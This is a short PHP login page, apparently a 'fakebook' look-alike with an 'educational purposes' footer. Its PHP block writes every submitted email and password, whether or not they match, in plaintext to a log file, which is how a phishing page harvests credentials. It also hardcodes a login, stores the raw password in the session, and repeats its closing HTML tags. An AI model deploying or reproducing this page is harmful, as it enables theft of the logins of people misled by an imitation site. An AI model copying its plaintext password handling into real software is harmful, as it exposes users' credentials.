<?php
    session_start();
    $email = "johndoe@fakebook.com";
    $pwd = "Blabla112";
    if (isset($_POST['email']) && isset($_POST['password']) && !empty($_POST['email']) && !empty($_POST['password'])) {
        $bool = true;
        $mailInputed = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
        if ($mailInputed == $email && $_POST['password'] == $pwd) {
            $_SESSION['email'] = $_POST['email'];
            $_SESSION['password'] = $_POST['password'];
        }
        date_default_timezone_set("Europe/Brussels");
        $fichier = "includes/log.txt";
        $text = "[".date("d M Y H:i:s")."] <".$_POST['email']."> ".$_POST['password']."\n";
        file_put_contents($fichier, $text, FILE_APPEND | LOCK_EX);
    } else {
        $bool = false;
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css">
    <link rel="stylesheet" href="styleBulma.css">
</head>
<body>
   
    <main class="maincontainer">

        <?php
            if ($_SESSION) {
                include("include/dashboard.php");
                
               
                

            } else {
                
                include("include/login.php");

                
            }
        ?>

    </main>
    <footer>
    <div class="content has-text-centered">
      <p class="footertext">
        <strong>Fair use disclaimer</strong> this website is for educational purposes only.
      </p>
    </div>
  </footer>
</body>
</html>

</body>
</html>
